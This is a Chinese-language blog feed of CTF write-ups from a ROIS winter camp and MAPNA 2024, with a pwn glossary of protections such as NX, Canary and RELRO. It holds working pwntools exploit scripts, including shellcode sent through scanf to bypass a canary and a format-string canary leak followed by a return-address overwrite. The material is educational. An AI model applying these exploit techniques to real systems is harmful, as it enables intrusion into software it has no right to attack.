alt="image-20240127220019037"></p><p>这就是最恶心的地方，不让onegadget，要自己构造orw烦死人了</p><p>更烦人的是是scanf</p><p>而程序有个无限scanf，说明有栈溢出，但是又有Canary</p><p>因此要绕过Canary，而scanf有个特性(mc十年老玩家了)，是输入+-之类的并不会占用缓冲区，因此不会占用栈，就不会碰到Canary，就是实现了绕过</p><p>然后学长还在程序留了一点东西</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214766.png" alt="image-20240127220332391" style="zoom: 50%;" /><p>这样就能溢出到这个放ret上</p><p>然后就会在栈上执行程序</p><p>就可以构造orw这也是最恶心的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./shellcode&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;114.116.233.171&#x27;</span>,<span class="number">10004</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sl = <span class="keyword">lambda</span> x:sh.sendline(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x67\x61\x6c\x66&#x27;</span>)))   <span class="comment">#任意值</span></span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;4199215&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x90\x90\x6a\x00&#x27;</span>)))    <span class="comment">##111111</span></span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x68\x66\x6c\x61&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x67\x48\x89\xe7&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x31\xf6\x6a\x02&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x58\x0f\x05\x48&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x89\xc7\x48\x89&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\xe6\xba\x00\x01&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x00\x00\x31\xc0&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x0f\x05\xbf\x01&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x00\x00\x00\x48&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x89\xe6\x6a\x01&#x27;</span>)))</span><br><span class="line">sl(<span class="built_in">str</span>(u32(<span class="string">b&#x27;\x58\x0f\x05\x00&#x27;</span>)))</span><br><span class="line">sl(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>有注释的地方需要特别注意就是这个地方是push 0，因为这个flag后面要有个\0才能读取，只能说难绷</p><h2 id="for1"><a href="#for1" class="headerlink" title="for1"></a>for1</h2><p>很简单</p><p>flag就在栈上</p><p>一个%n$s就有了</p><h2 id="for2"><a href="#for2" class="headerlink" title="for2"></a>for2</h2><p>这道题首先的思路就是连续覆盖两个栈，就可以覆盖返回地址，但是因为aslr导致栈地址不确定，因此我们要先泄露栈地址，我们发先rbp上的值与返回地址的差距为定值，因此泄露该值得到返回地址，之后再取低两位，但是这个不一定，只是比较方便，正确的应该是低四位，而低两位可以解但是可能会不通，多打几次即可</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Matryoshka-doll"><a href="#Matryoshka-doll" class="headerlink" title="Matryoshka doll"></a>Matryoshka doll</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u004d\u0048\u0067\u0031\u004d\u006a\u0052\u006d\u004e\u0044\u006b\u0031\u004d\u007a\u0064\u0069\u004e\u006a\u0067\u0030\u004d\u0044\u0063\u0032\u004d\u007a\u004d\u0030\u004e\u006a\u0063\u0031\u004e\u006d\u0055\u0032\u005a\u0054\u0064\u006c\u004e\u0032\u0055\u0033\u005a\u0041\u003d\u003d</span><br></pre></td></tr></table></figure><p>看名字俄罗斯套娃一看就很多层</p><p>然后这个是Unicode 解码之后就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MHg1MjRmNDk1MzdiNjg0MDc2MzM0Njc1NmU2ZTdlN2U3ZA==</span><br></pre></td></tr></table></figure><p>后面又&#x3D;&#x3D; 是base64的特征 解码之后就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x524f49537b6840763346756e6e7e7e7d</span><br></pre></td></tr></table></figure><p>一看就是ASCII码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROIS&#123;h@v3Funn~~&#125;</span><br></pre></td></tr></table></figure><h2 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWFzZSBXc0RSIHBPayBYZGZ2IElLbFAga0puIFdzRFIgUmZHeSBJS2xQIHJmZ1kgeWdCaiBXc2RSIFhkZlYgWlNRIE5qayBPTA==</span><br></pre></td></tr></table></figure><p>一眼base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Qase WsDR pOk Xdfv IKlP kJn WsDR RfGy IKlP rfgY ygBj WsdR XdfV ZSQ Njk OL</span><br></pre></td></tr></table></figure><p>看题目说是键盘那说明跟键盘有关</p><p>这串代表在键盘上围着的字母</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcometothecamp</span><br></pre></td></tr></table></figure><p>看题目说要capital</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROIS&#123;WELCOMETOTHECAMP&#125;</span><br></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="vue-terminal"><a href="#vue-terminal" class="headerlink" title="vue-terminal"></a>vue-terminal</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214767.png" alt="image-20240127221413304"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214768.png" alt="image-20240127221442707"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214769.png" alt="image-20240127221535997"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214770.png" alt="image-20240127221600595"></p><p>跟着提示走就flag了</p><h2 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h2><p>鼠标放重点 按enter键 秒了</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214771.png" alt="image-20240127221804256"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Easy-Find"><a href="#Easy-Find" class="headerlink" title="Easy_Find"></a>Easy_Find</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214772.png" alt="image-20240127222023096"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214773.png" alt="image-20240127222054786"></p><h2 id="Replacement"><a href="#Replacement" class="headerlink" title="Replacement"></a>Replacement</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214774.png" alt="image-20240127222200904"></p><h2 id="Easy-Crack"><a href="#Easy-Crack" class="headerlink" title="Easy_Crack"></a>Easy_Crack</h2><p>程序有个死循环 nop掉再运行就getshell</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214775.png" alt="image-20240127222415254"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214776.png" alt="image-20240127222518650"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;tryc&quot;&gt;&lt;a href=&quot;#tryc&quot; class=&quot;headerlink&quot; title=&quot;tryc&quot;&gt;&lt;/a&gt;try</summary>
      
    
    
    
    <category term="2024ROIS冬令营" scheme="http://s1nec-1o.github.io/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024mapna</title>
    <link href="http://s1nec-1o.github.io/2024/01/17/2024mapna/"/>
    <id>http://s1nec-1o.github.io/2024/01/17/2024mapna/</id>
    <published>2024-01-17T08:07:39.000Z</published>
    <updated>2024-04-28T14:14:09.832Z</updated>
    
    <content type="html"><![CDATA[<p>这算是赛后总结吧，学长说对新手很友好，我看不出来，只能说真的很”友好”。</p><p>这次虽然只做出一道题，但是总的来说收获还是非常多的</p><h1 id="ninipwn"><a href="#ninipwn" class="headerlink" title="ninipwn"></a>ninipwn</h1><p>这道题思路还是比较清晰的，主要还是脚本十分难写</p><p>首先check一下</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214911.png" alt="image-20240121214012422"></p><p>发现是64位的然后保护全开，主要是注意PIE和Canary保护</p><h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  disable_io_buffering();   <span class="comment">//初始化</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;XOR encryption service&quot;</span>);</span><br><span class="line">  encryption_service();     <span class="comment">//加密</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没什么东西，就一个初始化和加密函数</p><p>显然加密函数才是我们要注意的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">encryption_service</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Text length: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)text_length &lt; <span class="number">0x101</span> )     </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Key: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, key, <span class="number">0xA</span>uLL);                      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Key selected: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(key);          <span class="comment">//可能fmt</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Text: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, text_length);          <span class="comment">//向栈上写      </span></span><br><span class="line">    encrypt((__int64)buf);                    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Encrypted output: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, buf, text_length);       <span class="comment">//可能fmt            </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Text length must be less than 256&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先能我们会看到一些比较显眼的漏洞，就是第一个<code>printf(key);</code> 这个明显key是可控的，有着一个格式化字符串漏洞</p><p>然后key是一个char[8]型的然而能输入0xA个字符，显然数组越界</p><p>再深入探查的话<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214912.png" alt="image-20240121214710570"></p><p>会发现text_length的前两位是可以覆盖的，然后由于是小端存储 而且题目限定text_length我们输入进去的要小于0x101，因此<strong>覆盖的两位就是我们的text_length大小</strong>这点很重要，是整道题目的核心</p><hr><p><strong>这里插入一点：</strong></p><p><strong>在ida里，一个指针长度存储两个16进制值，例如0x4050上可能存储的是0x19等，因此上面text_length覆盖两个指针长度其实覆盖了4个16进制数</strong></p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, text_length); </span><br></pre></td></tr></table></figure><p>有了text_length的覆盖那么这段的text_length的大小就是可控的，而buf段位于栈上，因此有显然的栈溢出的漏洞，所以本题的核心就是覆盖返回地址</p><p>但是其中还有很多细节需要注意，就是本题开启了Canary保护，我们要绕过该保护，而PIE保护也要绕过，PIE使得整个可执行文件可以被加载到随机的地址，但是后12位(64位)无论是ASLR或者PIE都不会改变</p><p>但是本题目，覆盖的时候，只需要覆盖后8位即可更简便<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214914.png" alt="image-20240121220314128" style="zoom:50%;" /></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214915.png" alt="image-20240121220337900"></p><p>可以看到只有后8位不一样，因此只需要覆盖后八位即可，这样既方便又可以绕过PIE保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)text_length;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= text_length )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) ^= key[i % <span class="number">8</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是其中的加密函数，可以看到会加密text_length大小的内容，因此我们输入多少它加密多少，而这个是异或，就可以通过二次异或来返回原值</p><p>而Canary则通过那个格式化字符串漏洞泄露，Canary一般是在ebp-0x8的位置</p><p>因此可以通过<code>%xxx$p来泄露Canary的值</code></p><p>大致的思路就这样</p><p>附上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./ninipwn&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;3.75.185.198&#x27;</span>,<span class="number">7000</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#win_addr=0x1433</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Text length: &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;25&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Key: &#x27;</span>)</span><br><span class="line">key=<span class="string">b&#x27;%039$paa\x19\x01&#x27;</span></span><br><span class="line">sh.send(key)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">recv_data=sh.recv()</span><br><span class="line">canary_data=recv_data[:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(canary_data)</span><br><span class="line"><span class="comment">#text</span></span><br><span class="line">payload=p64(<span class="built_in">int</span>(canary_data,<span class="number">16</span>))+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x33&#x27;</span></span><br><span class="line">pay=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">264</span>):</span><br><span class="line">    pay+=<span class="built_in">chr</span>((<span class="number">31</span>^key[i%<span class="number">8</span>]))               <span class="comment">##chr是将整数转换为字符数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    pay+=<span class="built_in">chr</span>((payload[i]^key[i%<span class="number">8</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.send(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="写exp的总结："><a href="#写exp的总结：" class="headerlink" title="写exp的总结："></a>写exp的总结：</h2><ol><li>recv下来的东西，是字符串，不是整数，例如0x273437，他是一个长度8的字符串，因此需要等到0x再切片</li><li>send的东西，最后是字节序列，但字符串也是可以的</li><li>b’内容’该内容全部被转换位ASCII码的形式，如果想要输出01那么需要使用<code>\x01</code>来实现、</li><li>字节序列就是0到ff的整形构成的数组</li><li>canary截取下来是字符串类型，而其中的值需要转换成qword的形式，那么先用int来将将十六进制字符串转换为64位整数，之后再用p64一步搞定</li></ol><p>最后，虽然只能做出一题，但是其中的过程还是值得回味的，无论是失败还是成功，享受这个过程就可以，这道题能做出来学长居功至伟，解答了我非常多的问题，让我成长了许多，我将会继续学习，继续进步的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这算是赛后总结吧，学长说对新手很友好，我看不出来，只能说真的很”友好”。&lt;/p&gt;
&lt;p&gt;这次虽然只做出一道题，但是总的来说收获还是非常多的&lt;/p&gt;
&lt;h1 id=&quot;ninipwn&quot;&gt;&lt;a href=&quot;#ninipwn&quot; class=&quot;headerlink&quot; title=&quot;n</summary>
      
    
    
    
    <category term="小比赛" scheme="http://s1nec-1o.github.io/categories/%E5%B0%8F%E6%AF%94%E8%B5%9B/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwn基础入门小知识</title>
    <link href="http://s1nec-1o.github.io/2024/01/17/Pwn%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/"/>
    <id>http://s1nec-1o.github.io/2024/01/17/Pwn%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/</id>
    <published>2024-01-16T16:02:19.000Z</published>
    <updated>2024-04-28T09:08:50.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN小知识"><a href="#PWN小知识" class="headerlink" title="PWN小知识"></a>PWN小知识</h2><p>由于pwn相关的一些专业术语新手入门时不易了解(我也是)，因此在此写下零零碎碎(<strong>有错误请在评论区指出或补充</strong>)，并且还有一些相关容易忘记的命令(多看多用)</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>NX位（No-eXecute），也称为XD位（eXecute Disable），是现代CPU提供的一个硬件安全特性，用于标记内存页是否可以执行代码。启用NX位可以提高操作系统的安全性，因为它可以防止攻击者将数据区域（如栈或堆）中的代码作为执行指令。</p><p>当NX位启用时：</p><ul><li><strong>数据执行保护（DEP）</strong>：操作系统可以利用NX位来实现数据执行保护（DEP），防止在非执行内存区域（如默认的栈和堆）执行代码。</li><li><strong>防止缓冲区溢出攻击</strong>：这使得缓冲区溢出和某些类型的内存损坏攻击更加困难，因为即使攻击者能够将恶意代码注入到一个程序的内存空间，也不能执行注入的代码，因为内存页不允许执行。</li><li><strong>与ASLR协同工作</strong>：NX位通常与地址空间布局随机化（ASLR）结合使用，以进一步提高安全性。</li></ul><p>在大多数现代操作系统中，NX位默认是启用的。例如，在Linux系统中，可以通过执行<code>dmesg | grep NX</code>来检查NX位是否启用。如果看到输出中有”NX (Execute Disable) protection: active”这样的信息，就表示NX位是启用的。</p><p>在编译程序时，可以使用特定的编译器选项来确保生成的二进制文件与NX位特性兼容，例如在GCC中使用<code>-z noexecstack</code>选项可以防止栈被标记为可执行，这样就可以利用NX位提供的保护。</p><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>表示栈保护功能有没有开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。</p><p>在计算机安全领域，”canary”（金丝雀）一词通常指的是”栈金丝雀”，这是一种用于检测和防止缓冲区溢出攻击的保护措施。栈金丝雀是一个已知的值，它被放置在栈上的局部变量和控制数据（如返回地址）之间。其思想是，如果发生缓冲区溢出，并且覆盖了返回地址，那么在覆盖返回地址之前，这个金丝雀值也会被覆盖。</p><p>在函数调用结束之前，程序会检查栈金丝雀的值是否发生改变。如果金丝雀值被覆盖，程序就知道发生了栈溢出攻击，并且可以采取措施，通常是立即终止程序，以防止攻击者执行任意代码。这种方法是一种普遍的安全防护措施，被广泛应用于现代操作系统和编译器中。</p><p>当你看到”Canary found”这样的信息时，可能是在描述一个安全检查机制发现了栈金丝雀的值已经被篡改，从而检测到了潜在的攻击。</p><h3 id="GOT和PLT不为人知的关系"><a href="#GOT和PLT不为人知的关系" class="headerlink" title="GOT和PLT不为人知的关系"></a>GOT和PLT不为人知的关系</h3><p>在ELF（Executable and Linkable Format）文件中，GOT（Global Offset Table）和PLT（Procedure Linkage Table）协同工作以支持动态链接。它们通常用于动态链接库（shared libraries）中的函数调用。</p><p>这里是它们如何工作的简要概述：</p><ol><li><strong>PLT (Procedure Linkage Table)</strong>: 当你的程序调用一个动态链接库（如 libc）中的函数时，它实际上首先调用的是PLT中的一个”桩”（stub）。这个桩是一个小的代码片段，它跳转到GOT中的一个特定条目。</li><li><strong>GOT (Global Offset Table)</strong>: GOT包含了函数和变量的地址。在程序第一次调用外部函数时，GOT中相应的条目被设置为指向PLT中的另一个条目，该条目将控制权转交给动态链接器，它将查找真正的函数地址，然后更新GOT中的条目以指向该地址。这意味着在第一次调用之后，GOT条目会被更新，以后的每次调用都会直接跳转到实际的函数地址，而不再经过PLT。</li></ol><p>因此，回答你的问题：在程序启动时，GOT表上的函数地址并不存储PLT函数的地址，而是存储一个指向动态链接器进行符号解析的地址。一旦符号（例如函数）被解析，GOT表中的条目会<strong>被更新为指向实际的函数地址</strong>。这个过程被称为懒惰绑定（lazy binding），因为符号解析是在运行时按需进行的。</p><p>简而言之，GOT最初包含指向PLT中代码的指针，用于触发动态解析。解析完成后，GOT会被更新为指向实际的函数地址。</p><h3 id="RELRP"><a href="#RELRP" class="headerlink" title="RELRP"></a>RELRP</h3><p>Full RELRO（完全的重定位只读）和Partial RELRO（部分的重定位只读）是Linux系统中用来提高二进制程序安全性的技术。它们控制程序启动时动态链接器如何处理全局偏移表（GOT）和过程链接表（PLT）。以下是它们之间的主要区别：</p><h4 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h4><ul><li><strong>GOT保护</strong>: Partial RELRO不会将GOT设置为只读，这意味着程序运行时GOT中的条目可以被修改。</li><li><strong>性能</strong>: 通常比Full RELRO有更好的性能，因为它允许延迟绑定，即在函数第一次被调用时才解析其地址。</li><li><strong>安全性</strong>: 提供了一定程度的保护，但不如Full RELRO强。</li><li><strong>启动时间</strong>: 启动时间较短，因为不需要在程序启动时立即解析所有的动态符号。</li></ul><h4 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h4><ul><li><strong>GOT保护</strong>: 将GOT设置为只读，防止攻击者在运行时修改GOT中的条目。</li><li><strong>PLT和GOT分离</strong>: PLT条目在程序启动时就被解析并填充到GOT中，之后GOT被标记为只读。</li><li><strong>性能</strong>: 可能会有轻微的性能损失，因为启动时需要解析所有动态链接的函数地址。</li><li><strong>安全性</strong>: 提供更高水平的安全性，防止了GOT覆写攻击，这是一种常见的利用技术。</li><li><strong>启动时间</strong>: 启动时间可能会稍长，因为需要在程序执行前解析所有的动态符号。</li></ul><p>总的来说，Full RELRO提供了更高级别的安全保护，但可能会以轻微增加的启动时间和潜在的运行时性能开销为代价。Partial RELRO则提供了一个折中方案，它比没有RELRO的情况更安全，但提供的保护不如Full RELRO全面。</p><p>在编译时，可以使用以下GCC链接器选项来指定RELRO的级别：</p><ul><li><strong>Partial RELRO</strong>: <code>-Wl,-z,relro</code></li><li><strong>Full RELRO</strong>: <code>-Wl,-z,relro -Wl,-z,now</code></li></ul><p>选择哪种级别取决于你对安全性和性能的需求。对于安全性要求高的应用程序，推荐使用Full RELRO。</p><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>ASLR 是地址空间布局随机化（Address Space Layout Randomization）的缩写，是操作系统用来提高安全性的一种技术。ASLR 通过随机分配系统和程序的内存地址，使得攻击者很难预测和利用固定的地址来执行恶意操作。</p><p>以下是关于 ASLR 的一些关键点：</p><ol><li><strong>随机化</strong>：ASLR 